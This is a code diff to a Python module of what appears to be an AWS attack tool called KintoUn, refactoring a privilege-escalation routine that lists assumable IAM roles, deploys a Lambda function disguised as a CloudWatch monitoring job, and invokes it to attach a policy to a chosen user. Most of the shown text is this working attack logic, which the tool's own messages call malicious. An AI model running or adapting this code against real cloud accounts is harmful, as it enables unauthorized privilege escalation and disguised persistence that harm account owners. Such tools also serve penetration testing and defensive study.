@@ -1,11 +1,11 @@
 # Create a module that will create a lambda and invoke to attach a user policy on the predetermined user.
 import botocore
+import os
 import zipfile
 from modules.enumeration import iam_whoami as whoami
 from modules.enumeration import iam_enumerate_assume_role
-from functions import create_client, iam_handler
+from functions import create_client, iam_handler, utils
 from colorama import Fore, Style
-from time import sleep
 
 def create_lambda_client(botoconfig, session, region):
     client = create_client.Client(botoconfig, session, 'lambda', region)
@@ -70,7 +70,6 @@ def parse_assumable_role_option(role_list):
         print(Fore.RED + "[-] No roles to impersonate found..." + Style.RESET_ALL)
 
 def create_lambda_file(user_name):
-    lambda_path = './lambda_function.zip'
     lambda_function = '''
 import boto3
 
@@ -82,27 +81,28 @@ def lambda_handler(event, context):
 
     try:
         print('[+] Zipping Lambda function...')
+        lambda_path = utils.create_temp_zip_path()
         with zipfile.ZipFile(lambda_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
             zip_file.writestr('lambda_function.py', lambda_function)
-        return True
+        return lambda_path
     except Exception as e:
         print('Failed to zip Lambda: {}\n'.format(e))
-        return False
+        return None
 
-def aws_file():
-    with open("lambda_function.zip", 'rb') as file_data:
+def aws_file(lambda_path):
+    with open(lambda_path, 'rb') as file_data:
         bytes_content = file_data.read()
 
     return bytes_content
 
-def create_lambda_function(client, function_role):
+def create_lambda_function(client, function_role, lambda_path):
     response = client.create_function(
         FunctionName="MonitorFunction",
         Runtime="python3.7",
         Role=function_role,
         Handler="lambda_function.lambda_handler",
         Code={
-            "ZipFile": aws_file()
+            "ZipFile": aws_file(lambda_path)
         },
         Description="Lambda de monitoramento de Eventos do CloudWatch.",
         Publish=True,
@@ -128,7 +128,20 @@ def invoke_lambda(client, function_name):
 
     return response
 
+
+def collect_inputs(assumable_roles):
+    role_arn = None
+    if not assumable_roles:
+        option = input("[-] KintoUn wasn't able to retrieve a list of assumable roles...Do you want to input a role ARN manually? [y/N]")
+        if option.lower() == "y":
+            role_arn = input("Role Arn: ")
+    else:
+        role_arn = parse_assumable_role_option(assumable_roles)
+    region = input("[+] Select the region to create the lambda function: ")
+    return role_arn, region
+
 def main(botoconfig, session):
+    results = {}
     print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
     print("[+] Starting lambda privilege escalation module...")
 
@@ -137,35 +150,40 @@ def main(botoconfig, session):
 
     print("[+] Listing assumable roles...")
     assumable_roles = check_assumable_roles(botoconfig, session)
-    if not assumable_roles:
-        option = input("[-] KintoUn wasn't able to retrieve a list of assumable roles...Do you want to input a role ARN manually? [y/N]")
-        if option.lower() == "y":
-            role_arn = input("Role Arn: ")
-    else:
-        role_arn = parse_assumable_role_option(assumable_roles)
+    role_arn, region = collect_inputs(assumable_roles)
+    if not role_arn:
+        return utils.module_result(status="error", errors=["No role ARN was selected"])
 
     print("[+] Creating malicious lambda file...")
-    region = input("[+] Select the region to create the lambda function: ")
     lambda_client = create_lambda_client(botoconfig, session, region)
-    lambda_file = create_lambda_file(username)
-    if not lambda_file:
-        return False
+    lambda_path = create_lambda_file(username)
+    if not lambda_path:
+        return utils.module_result(status="error", errors=["Failed to create lambda archive"])
 
     print("[+] Creating malicious lambda function...")
-    lambda_function = create_lambda_function(lambda_client, role_arn)
+    lambda_function = create_lambda_function(lambda_client, role_arn, lambda_path)
+    results["FunctionName"] = lambda_function.get("FunctionName")
+    results["FunctionArn"] = lambda_function.get("FunctionArn")
     
     print("[+] Checking for lambda status...")
-    while True:
-        token = check_lambda_status(lambda_client)
-        if token:
-            break
-        else:
-            sleep(10)
+    token = utils.poll_until(
+        lambda: check_lambda_status(lambda_client),
+        interval_seconds=10,
+        max_attempts=36
+    )
+    if not token:
+        return utils.module_result(status="error", errors=["Timed out waiting for Lambda to become active"])
 
     print("[+] Invoking malicious lambda function...")
     try:
         function_run_results = invoke_lambda(lambda_client, lambda_function['FunctionName'])
         print("[+] Lambda Invoke Successfull! Enjoy...")
+        results["InvokeStatus"] = "success"
     except botocore.exceptions.ClientError as e:
         print("[-] Lambda failed to run...Status code "+Fore.RED+"{}".format(e)+Style.RESET_ALL)
+        results["InvokeStatus"] = "failed"
+    finally:
+        if os.path.exists(lambda_path):
+            os.remove(lambda_path)
+    return utils.module_result(data=results)
     
